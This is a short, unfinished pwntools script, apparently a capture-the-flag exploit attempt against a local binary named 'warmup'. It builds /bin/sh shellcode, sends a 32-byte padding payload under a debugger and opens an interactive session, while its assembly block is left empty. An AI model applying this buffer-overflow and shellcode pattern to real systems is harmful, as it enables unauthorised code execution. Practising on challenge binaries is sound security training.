from pwn import *

io = process("./warmup")

context(os = 'linux', arch = 'i386')
shellcode = asm(shellcraft.sh())
mov = asm("""
    
    """)
print(len(shellcode))
gdb.attach(io)
payload = b"a" * (0x20) 
io.send(payload)
io.interactive()
